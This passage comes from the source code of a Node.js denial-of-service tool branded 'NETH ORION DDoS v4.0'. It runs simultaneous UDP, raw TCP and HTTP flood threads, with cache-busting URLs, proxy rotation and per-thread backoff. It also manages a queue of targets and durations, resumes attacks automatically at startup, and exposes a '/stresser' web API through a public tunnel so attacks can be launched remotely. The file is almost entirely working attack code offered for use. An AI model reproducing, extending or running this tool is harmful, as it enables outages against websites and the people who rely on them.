    // this will never fire — server downtime should not count toward the attack duration.
    if (Date.now() - target.startTime > target.duration * 20) {
      console.log(colors.yellow(`[Safety] Wall-clock ${Math.round((Date.now()-target.startTime)/60000)}min exceeded 20x target duration — force stopping`));
      if (targetQueue.length > 0) {
        currentTarget = targetQueue.shift();
        const nextTarget = currentTarget;
        resetTotal();
        totalEffectiveMs = 0;
        state = { continueAttack, currentTarget: nextTarget, totalRequests: totalRequestsSent, queue: targetQueue, totalEffectiveMs: 0 };
        saveNow();
        currentTarget = nextTarget;
        // Clear old thread backoff states — new threads start fresh
        threadBackoff.clear();
        const proxies = loadProxies();
        let nextThreadId = 0;
        if (!proxies.length) {
          for (let i = 0; i < numThreads; i++) {
            if (!continueAttack) break;
            performAttackSingle(nextTarget, { type: "direct" }, nextThreadId++, true);
          }
        } else {
          const directCount = Math.floor(numThreads / 2);
          for (let i = 0; i < directCount; i++) {
            if (!continueAttack) break;
            performAttackSingle(nextTarget, { type: "direct" }, nextThreadId++, true);
          }
          for (let i = 0; i < numThreads - directCount; i++) {
            if (!continueAttack) break;
            performAttackSingle(nextTarget, createContext(getRandomElement(proxies)), nextThreadId++, false);
          }
        }
        console.log(colors.green(`Spawned ${nextThreadId} threads for: ${nextTarget.url}`));
      } else {
        continueAttack = false;
        currentTarget = null;
        resetTotal();
        totalEffectiveMs = 0;
        state = { continueAttack: false, currentTarget: null, totalRequests: 0, queue: [], totalEffectiveMs: 0 };
        saveNow();
        console.log(colors.yellow("All targets completed. Attack finished."));
      }
      return;
    }

    // Launch ALL attack types simultaneously
    if (USE_UDP) {
      const parsed = new URL(target.url);
      udpFlood(parsed.hostname, parsed.port || 80, threadId);
    }
    if (USE_RAW_TCP) {
      const parsed = new URL(target.url);
      rawTCPFlood(parsed.hostname, parsed.port || 80, threadId);
    }
    // HTTP/L7 requests fire concurrently with UDP/TCP above
    const startTime = Date.now();
    const promises = [];
    for (let i = 0; i < REQUESTS_PER_CYCLE; i++) {
      const cb = generateCacheBuster();
      const sep = target.url.includes("?") ? "&" : "?";
      const url = `${target.url}${sep}_=${cb}&nocache=${cb}&cb=${Date.now()}&r=${Math.random()}`;
      if (ctx.type === "socks") {
        promises.push(socksRequest(url, ctx.agent, threadId));
      } else if (ctx.type === "http") {
        promises.push(
          urequest(url, { dispatcher: ctx.dispatcher, method: "GET", headers: getNoCacheHeaders(), signal: AbortSignal.timeout(REQUEST_TIMEOUT) })
            .then(async (res) => { lastSuccessTime = Date.now(); await res.body.dump(); return { status: res.statusCode }; })
            .catch(() => null)
        );
      } else {
        promises.push(fireHTTPRequest(url, ctx, threadId));
      }
    }

    let successfulRequests = 0;
    try {
      const results = await Promise.allSettled(promises);
      for (const r of results) {
        if (r.status === "fulfilled" && r.value && r.value.status) successfulRequests++;
      }
    } catch {}

    totalRequestsSent += successfulRequests;
    debouncedSave();

    // Per-thread backoff: if 0 successes, delay next cycle (prevents local resource exhaustion)
    if (successfulRequests === 0 && REQUESTS_PER_CYCLE > 0) {
      let state = threadBackoff.get(threadId) || { consecutiveFailures: 0, backoffMs: 0 };
      state.consecutiveFailures++;
      // Exponential backoff: 500ms → 1s → 2s → 5s (max)
      state.backoffMs = Math.min(5000, Math.max(500, state.backoffMs * 2 || 500));
      threadBackoff.set(threadId, state);
      backoffDelay = state.backoffMs;
    } else {
      // Reset backoff on success
      threadBackoff.delete(threadId);
    }

    const duration = Date.now() - startTime;
    if (threadId === 0 && duration > 0) {
      const now = Date.now();
      if (now - lastStatusLog > 1000) {
        lastStatusLog = now;
        const rps = (successfulRequests / (duration / 1000)).toFixed(1);
        const backoffHint = successfulRequests === 0 ? ` ${colors.gray(`[backoff]`)}` : '';
        console.log(`${colors.green(">")} ${colors.gray(`[${new Date().toLocaleTimeString()}]`)} ${colors.red(`${formatNumber(successfulRequests)} req`)} | ${colors.cyan(`Total: ${formatNumber(totalRequestsSent)}`)} | ${colors.green(`RPS: ${rps}`)} | ${colors.magenta(`Threads: ${activeThreads.length}`)}${backoffHint}`);
      }
    }
  } catch (err) {
    try { console.error(colors.red(`[Thread ${threadId}] Attack error: ${err.message}`)); } catch {}
  }

  // Always schedule next cycle — errors in one cycle never kill the thread
  if (continueAttack) {
    const j = getJitter();
    const delay = backoffDelay > 0 ? backoffDelay : (j > 0 ? j : 0);
    if (delay > 0) setTimeout(() => performAttackSingle(target, ctx, threadId, isDirect), delay);
    else setImmediate(() => performAttackSingle(target, ctx, threadId, isDirect));
  }
};

const stopAttack = async () => {
  if (!continueAttack) { console.log(colors.yellow("No active attack")); return; }
  continueAttack = false;
  stopWatchdog();
  stopProductiveTimer();
  closeAllUdpSockets();
  stopStatusDisplay();
  broadcastToWorkers({ type: "stop" });
  activeThreads = [];
  currentTarget = null;
  targetQueue = [];
  resetTotal();
  state = { continueAttack: false, currentTarget: null, totalRequests: 0, queue: [] };
  saveNow();
  console.log(colors.yellow("\nAttack Stopped"));
  console.log(colors.green("Queue cleared. Total reset to 0\n"));
};

const resumeAttack = async () => {
  if (!continueAttack || !currentTarget) return;
  console.log(colors.yellow(`Resuming attack on: ${currentTarget.url}`));
  console.log(colors.cyan(`Queue length: ${targetQueue.length}/${MAX_QUEUE}`));
  lastSuccessTime = Date.now();

  if (USE_CLUSTER && cluster.isMaster) {
    const numWorkers = Object.keys(cluster.workers).length;
    const threadsPerWorker = Math.ceil(numThreads / numWorkers);
    for (const id in cluster.workers) {
      cluster.workers[id].send({ type: "start", target: currentTarget, threadsForMe: threadsPerWorker });
    }
    startStatusDisplay();
    startProductiveTimer();
    console.log(colors.green(`Resumed with ${numWorkers} workers (${threadsPerWorker} threads each)`));
    return;
  }

  const proxies = loadProxies();
  activeThreads = [];
  let threadId = 0;

  if (!proxies.length) {
    for (let i = 0; i < numThreads; i++) {
      if (!continueAttack) break;
      performAttackSingle(currentTarget, { type: "direct" }, threadId++, true);
      activeThreads.push(i);
    }
    console.log(colors.green(`Resumed with ${activeThreads.length} threads (direct)`));
  } else {
    const halfThreads = Math.floor(numThreads / 2);
    for (let i = 0; i < halfThreads; i++) {
      if (!continueAttack) break;
      performAttackSingle(currentTarget, { type: "direct" }, threadId++, true);
      activeThreads.push(i);
    }
    for (let i = 0; i < numThreads - halfThreads; i++) {
      if (!continueAttack) break;
      performAttackSingle(currentTarget, createContext(getRandomElement(proxies)), threadId++, false);
      activeThreads.push(i + halfThreads);
    }
    console.log(colors.green(`Resumed with ${activeThreads.length} threads (${halfThreads} direct + ${numThreads - halfThreads} proxy)`));
  }
  startWatchdog();
  startProductiveTimer();
};

const autoStartTunnel = async () => {
  const tunnelSubdomain = process.env.NPORT || "ddos";
  console.log(colors.cyan(`Starting tunnel: ${tunnelSubdomain}`));
  try {
    const url = await nport.start(25694, tunnelSubdomain, { disableSuffix: false });
    if (url) { nportUrl = url; tunnelActive = true; console.log(colors.green(`Tunnel active: ${nportUrl}`)); return true; }
    console.log(colors.red("Tunnel failed"));
    return false;
  } catch (err) {
    console.log(colors.red(`Tunnel error: ${err.message}`));
    return false;
  }
};

const showStatus = () => {
  if (!continueAttack || !currentTarget) { console.log(colors.yellow("No active attack")); return; }
  const effectivePct = currentTarget.duration > 0 ? Math.min(100, Math.round((totalEffectiveMs / currentTarget.duration) * 100)) : 0;
  const effectiveMin = Math.round(totalEffectiveMs / 60000);
  const wallMs = Date.now() - currentTarget.startTime;
  const wallMin = Math.round(wallMs / 60000);
  const targetMin = Math.round(currentTarget.duration / 60000);
  console.log(colors.cyan("\n=== ATTACK STATUS ==="));
  console.log(`${colors.yellow("Current Target:")} ${currentTarget.url}`);
  console.log(`${colors.gray(`Target duration: ${targetMin}min`)}`);
  console.log(`${colors.cyan(`Effective time: ${effectiveMin}min (${effectivePct}% of target)`)}`);
  console.log(`${colors.gray(`Wall-clock elapsed: ${wallMin}min`)}`);
  console.log(`${colors.green("Requests Sent:")} ${formatNumber(totalRequestsSent + totalReqCount)}`);
  if (USE_CLUSTER && cluster.isMaster) {
    console.log(`${colors.cyan("Workers:")} ${Object.keys(cluster.workers).length}`);
  } else {
    console.log(`${colors.cyan("Active Threads:")} ${activeThreads.length}`);
  }
  console.log(`${colors.magenta("Queue:")} ${targetQueue.length}/${MAX_QUEUE}`);
  if (targetQueue.length > 0) {
    console.log(`${colors.yellow("\nQueued Targets:")}`);
    targetQueue.forEach((t, idx) => {
      console.log(`  ${idx + 1}. ${t.url} (${Math.round(t.duration/60000)}min each)`);
    });
  }
  if (tunnelActive && nportUrl) console.log(`${colors.magenta("\nPublic URL:")} ${nportUrl}`);
  console.log("");
};

const showHelp = () => {
  console.log(colors.cyan("\n=== NETH ORION DDoS v4.0 ==="));
  console.log(`${colors.green("start <url> [hours]")}        - Start multi-threaded attack`);
  console.log(`${colors.green("add <url> [hours]")}          - Add to queue`);
  console.log(`${colors.green("stop")}                       - Stop attack`);
  console.log(`${colors.green("status")}                     - Show status`);
  console.log(`${colors.green("queue")}                      - Show queue only`);
  console.log(`${colors.green("clear")}                      - Clear console`);
  console.log(`${colors.green("help")}                       - This help`);
  console.log(`${colors.green("exit")}                       - Exit\n`);
  const mode = USE_CLUSTER && cluster.isMaster ? `Cluster (${Object.keys(cluster.workers).length} workers)` : "Single-process";
  console.log(colors.gray(`Threads: ${numThreads} | Cycle: ${REQUESTS_PER_CYCLE} | Mode: ${mode}`));
  console.log(colors.gray(`UDP: ${USE_UDP} | Raw TCP: ${USE_RAW_TCP} | L7 Bypass: ${L7_BYPASS} | Keep-Alive: ${KEEP_ALIVE}`));
};

const showQueue = () => {
  if (targetQueue.length === 0) { console.log(colors.yellow("\nQueue is empty")); }
  else {
    console.log(colors.cyan("\n=== QUEUE ==="));
    targetQueue.forEach((t, idx) => {
      const r = ((t.startTime + t.duration - Date.now()) / (60 * 60 * 1000)).toFixed(2);
      console.log(`${idx + 1}. ${t.url} (${r}h left in queue)`);
    });
  }
  console.log(`\n${colors.magenta(`${targetQueue.length}/${MAX_QUEUE} slots used`)}`);
};

const clearConsole = () => {
  console.clear();
  console.log(colors.green("NETH ORION DDoS v4.0"));
  const mode = USE_CLUSTER && cluster.isMaster ? `Cluster (${Object.keys(cluster.workers).length} workers)` : "Single-process";
  console.log(colors.gray(`Mode: ${mode} | Keep-Alive: ${KEEP_ALIVE} | UDP: ${USE_UDP} | RAW: ${USE_RAW_TCP} | L7: ${L7_BYPASS}`));
  console.log(colors.gray('Type "help" for commands\n'));
};

const handleCommand = async (cmd) => {
  const parts = cmd.trim().split(/\s+/);
  const command = parts[0].toLowerCase();
  const args = parts.slice(1);
  switch (command) {
    case "start":
      if (args.length < 1) { console.log(colors.red("Usage: start <url> [hours]")); return; }
      await startAttack(args[0], args[1] ? parseFloat(args[1]) : 1);
      break;
    case "add":
      if (args.length < 1) { console.log(colors.red("Usage: add <url> [hours]")); return; }
      await addToQueue(args[0], args[1] ? parseFloat(args[1]) : 1);
      break;
    case "queue": showQueue(); break;
    case "stop": await stopAttack(); break;
    case "status": showStatus(); break;
    case "clear": clearConsole(); break;
    case "help": showHelp(); break;
    case "exit": console.log(colors.yellow("Goodbye!")); process.exit(0); break;
    default:
      if (command) console.log(colors.red(`Unknown: ${command}`));
      showHelp();
  }
};

// ===================== EXPRESS ROUTES =====================

const app = express();
app.use(express.json());

app.get("/stresser", async (req, res) => {
  const url = req.query.url;
  const duration = parseFloat(req.query.duration) || 1;
  if (!url || !/^https?:\/\//.test(url)) return res.status(400).json({ error: "Invalid URL" });
  await startAttack(url, duration);
  res.json({ success: true, message: `Attack started on ${url}` });
});

app.get("/add", async (req, res) => {
  const url = req.query.url;
  const duration = parseFloat(req.query.duration) || 1;
  if (!url || !/^https?:\/\//.test(url)) return res.status(400).json({ error: "Invalid URL" });
  const success = await addToQueue(url, duration);
  res.json({ success, currentQueue: targetQueue.length });
});

app.get("/stop", async (req, res) => {
  await stopAttack();
  res.json({ success: true, totalRequests: totalRequestsSent });
});

app.get("/status", (req, res) => {
  res.json({
    active: continueAttack,
    currentTarget: currentTarget ? currentTarget.url : null,
    totalRequests: totalRequestsSent + totalReqCount,
    threads: USE_CLUSTER && cluster.isMaster ? Object.keys(cluster.workers).length : activeThreads.length,
    queueCount: targetQueue.length,
    clusterMode: USE_CLUSTER && cluster.isMaster,
  });
});

// ===================== STARTUP =====================

const port = process.env.PORT || 25694;

(async () => {
  await autoStartTunnel();
  app.listen(port, () => {
    console.clear();
    const mode = USE_CLUSTER && cluster.isMaster ? `CLUSTER (${Object.keys(cluster.workers).length} workers)` : "SINGLE PROCESS";
    console.log(colors.green(`\nNETH ORION DDoS v4.0`));
    console.log(colors.cyan(`Local API: http://localhost:${port}`));
    console.log(colors.magenta(`Mode: ${mode} | Threads: ${numThreads} | Keep-Alive: ${KEEP_ALIVE}`));
    console.log(colors.red(`UDP: ${USE_UDP} | Raw TCP: ${USE_RAW_TCP} | L7: ${L7_BYPASS} | Keep-Alive: ${KEEP_ALIVE}`));
    if (tunnelActive && nportUrl) console.log(colors.magenta(`Public API: ${nportUrl}`));
    console.log(colors.green('\nType "help" for commands\n'));

    resumeAttack();

    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    rl.setPrompt(colors.red("neth-orion> "));
    rl.prompt();
    rl.on("line", async (input) => {
      await handleCommand(input);
      rl.prompt();
    });
  });
})();
